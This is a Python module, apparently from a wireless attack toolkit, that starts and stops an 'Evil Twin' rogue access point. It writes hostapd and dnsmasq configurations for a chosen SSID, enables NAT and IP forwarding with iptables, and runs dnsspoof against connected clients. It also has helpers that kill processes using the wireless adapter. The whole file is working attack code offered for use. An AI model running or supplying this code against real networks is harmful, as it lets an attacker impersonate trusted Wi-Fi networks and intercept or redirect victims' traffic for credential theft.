import os
import subprocess
import threading
import signal
from typing import Optional, Dict, List

EVIL_TWIN_DIR = os.path.dirname(os.path.abspath(__file__))
CONFIG_DIR = os.path.join(EVIL_TWIN_DIR, "run")
LOG_FILE = os.path.join(CONFIG_DIR, "evil_twin.log")
PID_FILE = os.path.join(CONFIG_DIR, "evil_twin.pid")

HOSTAPD_CONF = os.path.join(CONFIG_DIR, "hostapd.conf")
DNSMASQ_CONF = os.path.join(CONFIG_DIR, "dnsmasq.conf")

# Ensure config dir exists
os.makedirs(CONFIG_DIR, exist_ok=True)

def check_interface_support(interface: str) -> bool:
    """Check if interface supports AP mode"""
    try:
        result = subprocess.run(['iw', 'dev', interface, 'info'], 
                              capture_output=True, text=True, check=True)
        # Get phy number
        for line in result.stdout.split('\n'):
            if 'wiphy' in line:
                phy_num = line.split()[-1]
                break
        else:
            return False
        
        # Check AP support
        phy_result = subprocess.run(['iw', 'phy', f'phy{phy_num}', 'info'], 
                                   capture_output=True, text=True, check=True)
        return 'AP' in phy_result.stdout
    except:
        return False

def set_regulatory_domain():
    """Set regulatory domain to US for better channel support"""
    try:
        subprocess.run(['sudo', 'iw', 'reg', 'set', 'US'], 
                      capture_output=True, check=True)
        print("[+] Set regulatory domain to US")
    except Exception as e:
        print(f"[!] Failed to set regulatory domain: {e}")

def reset_interface(interface: str):
    """Reset interface to clean state"""
    try:
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'down'], 
                      capture_output=True, check=True)
        subprocess.run(['sudo', 'iw', 'dev', interface, 'set', 'type', 'managed'], 
                      capture_output=True, check=True)
        subprocess.run(['sudo', 'ip', 'link', 'set', interface, 'up'], 
                      capture_output=True, check=True)
        print(f"[+] Reset interface {interface}")
    except Exception as e:
        print(f"[!] Failed to reset interface {interface}: {e}")

def create_hostapd_config(interface: str, ssid: str, channel: str) -> str:
    config_content = f"""interface={interface}
driver=nl80211
ssid={ssid}
hw_mode=g
channel={channel}
macaddr_acl=0
ignore_broadcast_ssid=0
auth_algs=1
wmm_enabled=0
"""
    with open(HOSTAPD_CONF, "w") as f:
        f.write(config_content)
    return HOSTAPD_CONF

def create_dnsmasq_config(interface: str) -> str:
    config_content = f"""interface={interface}
dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h
dhcp-option=3,192.168.1.1
dhcp-option=6,192.168.1.1
server=8.8.8.8
log-queries
log-dhcp
listen-address=127.0.0.1
"""
    with open(DNSMASQ_CONF, "w") as f:
        f.write(config_content)
    return DNSMASQ_CONF

def run_command(command: str, log_file: str, shell: bool = True) -> subprocess.Popen:
    with open(log_file, "a") as log:
        proc = subprocess.Popen(command, shell=shell, stdout=log, stderr=log, preexec_fn=os.setsid)
    return proc

def setup_fake_ap_network(interface: str, log_file: str):
    cmds = [
        f"ifconfig {interface} up 192.168.1.1 netmask 255.255.255.0",
        f"route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1",
        f"iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port 80",
        f"iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE",
        f"iptables --append FORWARD --in-interface {interface} -j ACCEPT",
        "echo 1 | tee /proc/sys/net/ipv4/ip_forward"
    ]
    for cmd in cmds:
        run_command(cmd, log_file)

def start_evil_twin(ssid: str, interface: str, channel: str) -> Dict:
    if is_running():
        return {"error": "Evil Twin attack is already running."}
    
    # Pre-flight checks and setup
    print("[*] Running pre-flight checks...")
    
    # Check interface support
    if not check_interface_support(interface):
        return {"error": f"Interface {interface} does not support AP mode. Try wlan0 or a USB WiFi adapter."}
    
    # Set regulatory domain
    set_regulatory_domain()
    
    # Reset interface
    reset_interface(interface)
    
    # Clean up old logs/configs
    for f in [LOG_FILE, PID_FILE, HOSTAPD_CONF, DNSMASQ_CONF]:
        try:
            os.remove(f)
        except FileNotFoundError:
            pass
    
    # Create configs
    create_hostapd_config(interface, ssid, channel)
    create_dnsmasq_config(interface)
    
    # Setup network
    setup_fake_ap_network(interface, LOG_FILE)
    
    # Start services
    procs = {}
    procs["hostapd"] = run_command(f"hostapd {HOSTAPD_CONF}", LOG_FILE)
    procs["dnsmasq"] = run_command(f"dnsmasq -C {DNSMASQ_CONF} -d", LOG_FILE)
    procs["dnsspoof"] = run_command(f"dnsspoof -i {interface}", LOG_FILE)
    
    # Store PIDs
    with open(PID_FILE, "w") as f:
        for name, proc in procs.items():
            f.write(f"{name}:{proc.pid}\n")
    
    print(f"[+] Evil Twin attack started on {interface} with SSID '{ssid}'")
    return {"running": True, "pids": {k: v.pid for k, v in procs.items()}}

def stop_evil_twin() -> Dict:
    if not os.path.exists(PID_FILE):
        return {"running": False, "error": "No running Evil Twin attack found."}
    
    with open(PID_FILE) as f:
        lines = f.readlines()
    
    errors = []
    for line in lines:
        try:
            name, pid = line.strip().split(":")
            pid = int(pid)
            os.killpg(pid, signal.SIGTERM)
            print(f"[+] Stopped {name} (PID: {pid})")
        except Exception as e:
            errors.append(f"Failed to kill {line.strip()}: {e}")
    
    try:
        os.remove(PID_FILE)
    except Exception:
        pass
    
    print("[+] Evil Twin attack stopped")
    return {"running": False, "errors": errors}

def is_running() -> bool:
    if not os.path.exists(PID_FILE):
        return False
    with open(PID_FILE) as f:
        lines = f.readlines()
    for line in lines:
        try:
            _, pid = line.strip().split(":")
            pid = int(pid)
            os.kill(pid, 0)
        except Exception:
            return False
    return True

def get_status() -> Dict:
    running = is_running()
    pids = {}
    if running:
        with open(PID_FILE) as f:
            for line in f:
                name, pid = line.strip().split(":")
                pids[name] = int(pid)
    return {"running": running, "pids": pids}

def get_logs(lines: int = 50) -> List[str]:
    if not os.path.exists(LOG_FILE):
        return []
    with open(LOG_FILE) as f:
        all_lines = f.readlines()
    return all_lines[-lines:]

def list_interfaces() -> List[str]:
    # Parse /proc/net/dev for interface names
    interfaces = []
    try:
        with open("/proc/net/dev") as f:
            for line in f.readlines()[2:]:
                iface = line.split(":")[0].strip()
                if iface and iface.startswith('wlan'):
                    interfaces.append(iface)
    except Exception:
        pass
    return interfaces 

def kill_adapter_processes_and_restart_network_manager():
    """
    Auto-detect the connected wireless adapter, kill all processes using it, and restart NetworkManager.
    Returns a dict with actions and errors.
    """
    import re
    result = {"actions": [], "errors": []}
    try:
        # Auto-detect interface
        interface = None
        with open("/proc/net/dev") as f:
            for line in f.readlines()[2:]:
                iface = line.split(":")[0].strip()
                if iface.startswith("wlan") or iface.startswith("wl"):  # covers wlan0, wlan1, wlp2s0, etc.
                    interface = iface
                    break
        if not interface:
            result["errors"].append("No wireless interface found.")
            return result
        result["actions"].append(f"Using interface: {interface}")
        # Find and kill processes using the interface
        try:
            # Use lsof to find processes using the interface
            lsof_cmd = ["lsof", "-i", f"@{interface}"]
            lsof_out = subprocess.run(lsof_cmd, capture_output=True, text=True)
            pids = set()
            for line in lsof_out.stdout.splitlines():
                m = re.search(r"\b(\d+)\b", line)
                if m:
                    pids.add(int(m.group(1)))
            # Fallback: use fuser
            if not pids:
                fuser_cmd = ["fuser", "-v", f"/sys/class/net/{interface}"]
                fuser_out = subprocess.run(fuser_cmd, capture_output=True, text=True)
                for line in fuser_out.stdout.splitlines():
                    m = re.search(r"\b(\d+)\b", line)
                    if m:
                        pids.add(int(m.group(1)))
            for pid in pids:
                try:
                    os.kill(pid, signal.SIGTERM)
                    result["actions"].append(f"Killed process {pid} using {interface}")
                except Exception as e:
                    result["errors"].append(f"Failed to kill process {pid}: {e}")
            if not pids:
                result["actions"].append(f"No processes found using {interface}")
        except Exception as e:
            result["errors"].append(f"Error finding/killing processes: {e}")
        # Restart NetworkManager
        try:
            subprocess.run(["sudo", "systemctl", "restart", "NetworkManager"], capture_output=True, check=False)
            result["actions"].append("Restarted NetworkManager service")
        except Exception as e:
            result["errors"].append(f"Failed to restart NetworkManager: {e}")
    except Exception as e:
        result["errors"].append(str(e))
    return result

def reset_wireless_interface_to_managed():
    """
    Reset wireless interface to managed mode: ifconfig wlan0 down; iwconfig wlan0 mode managed; ifconfig wlan0 up
    Returns a dict with actions and errors.
    """
    result = {"actions": [], "errors": []}
    try:
        # Auto-detect interface
        interface = None
        with open("/proc/net/dev") as f:
            for line in f.readlines()[2:]:
                iface = line.split(":")[0].strip()
                if iface.startswith("wlan") or iface.startswith("wl"):  # covers wlan0, wlan1, wlp2s0, etc.
                    interface = iface
                    break
        if not interface:
            result["errors"].append("No wireless interface found.")
            return result
        result["actions"].append(f"Using interface: {interface}")
        
        # Execute the reset commands
        commands = [
            f"sudo ifconfig {interface} down",
            f"sudo iwconfig {interface} mode managed", 
            f"sudo ifconfig {interface} up"
        ]
        
        for cmd in commands:
            try:
                subprocess.run(cmd.split(), capture_output=True, check=True)
                result["actions"].append(f"Executed: {cmd}")
            except subprocess.CalledProcessError as e:
                result["errors"].append(f"Failed to execute '{cmd}': {e}")
            except Exception as e:
                result["errors"].append(f"Error executing '{cmd}': {e}")
                
    except Exception as e:
        result["errors"].append(str(e))
    return result 